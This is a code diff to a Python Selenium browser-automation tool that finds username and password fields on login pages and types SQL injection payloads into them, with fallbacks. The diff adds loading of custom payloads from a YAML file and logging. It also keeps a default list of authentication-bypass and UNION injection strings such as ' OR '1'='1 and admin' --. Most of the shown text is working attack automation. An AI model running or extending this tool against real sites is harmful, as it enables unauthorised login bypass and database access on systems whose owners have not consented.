@@ -18,6 +18,7 @@ import os
 import base64
 import platform
 import logging
+import yaml
 from datetime import datetime
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.alert import Alert
@@ -773,7 +774,7 @@ class FirefoxBrowserAutomationTool(BaseTool):
                 elements = driver.find_elements(By.CSS_SELECTOR, selector)
                 if elements and elements[0].is_displayed():
                     logger.info(f"Found username/email field with selector: {selector}")
-                    form_fields['email'] = selector
+                    form_fields['username'] = selector  # Changed from 'email' to 'username' for clarity
                     break
             except Exception:
                 continue
@@ -789,6 +790,12 @@ class FirefoxBrowserAutomationTool(BaseTool):
             except Exception:
                 continue
         
+        # Log the detected fields
+        if form_fields:
+            logger.info(f"Auto-detected {len(form_fields)} form fields: {list(form_fields.keys())}")
+        else:
+            logger.warning("No form fields were auto-detected")
+            
         return form_fields
         
     def _execute_with_multiple_payloads(self, driver, form_fields, initial_payload, capture_screenshot, max_retries, popup_timeout):
@@ -808,18 +815,43 @@ class FirefoxBrowserAutomationTool(BaseTool):
         """
         logger.info("Executing injection with multiple fallback payloads")
         
+        # Check if custom payloads file exists and is not empty
+        custom_payloads = []
+        custom_payloads_file = "custom_payloads.yaml"
+        try:
+            if os.path.exists(custom_payloads_file):
+                logger.info(f"Found custom payloads file: {custom_payloads_file}")
+                with open(custom_payloads_file, 'r') as file:
+                    yaml_content = yaml.safe_load(file)
+                    if yaml_content and 'payloads' in yaml_content and yaml_content['payloads']:
+                        custom_payloads = yaml_content['payloads']
+                        logger.info(f"Loaded {len(custom_payloads)} custom payloads from {custom_payloads_file}")
+                        if len(custom_payloads) > 0:
+                            logger.info(f"First custom payload: {custom_payloads[0]}")
+                    else:
+                        logger.warning("Custom payloads file exists but contains no payloads or has invalid format")
+            else:
+                logger.info(f"No custom payloads file found at: {custom_payloads_file}")
+        except Exception as e:
+            logger.warning(f"Error loading custom payloads: {str(e)}")
+        
         # List of payloads to try in order
-        payloads = [
-            initial_payload,  # Start with the provided payload
-            "' OR '1'='1",    # Classic authentication bypass
-            "admin' --",      # Another common authentication bypass
-            "' OR 1=1 --",    # Variation with comment
-            "' OR '1'='1' --",# Variation with comment
-            "admin'; --",     # SQL Server style
-            "1' OR '1' = '1", # Variation without trailing quote
-            "a' UNION SELECT 1,2,3 --", # UNION attack
-            "' OR 1=1 LIMIT 1; --"  # Limiting to first record
-        ]
+        if custom_payloads:
+            payloads = custom_payloads
+            logger.info("USING CUSTOM PAYLOADS instead of default payloads")
+        else:
+            # Default payloads if no custom ones are provided
+            payloads = [
+                initial_payload,  # Start with the provided payload
+                "' OR '1'='1",    # Classic authentication bypass
+                "admin' --",      # Another common authentication bypass
+                "' OR 1=1 --",    # Variation with comment
+                "' OR '1'='1' --",# Variation with comment
+                "admin'; --",     # SQL Server style
+                "1' OR '1' = '1", # Variation without trailing quote
+                "a' UNION SELECT 1,2,3 --", # UNION attack
+                "' OR 1=1 LIMIT 1; --"  # Limiting to first record
+            ]
         
         result = {
             'success': False,
@@ -1048,8 +1080,8 @@ class FirefoxBrowserAutomationTool(BaseTool):
                         field_element.click()  # Ensure focus
                         field_element.clear()
                         
-                        # For password field, use password variation of payload if the main field got the regular payload
-                        field_value = payload if not is_password or field_name.lower() == "username" else f"{payload}123"
+                        # Use the exact payload as provided without any modifications
+                        field_value = payload
                         
                         # Send payload as a single operation instead of character-by-character
                         field_element.send_keys(field_value)
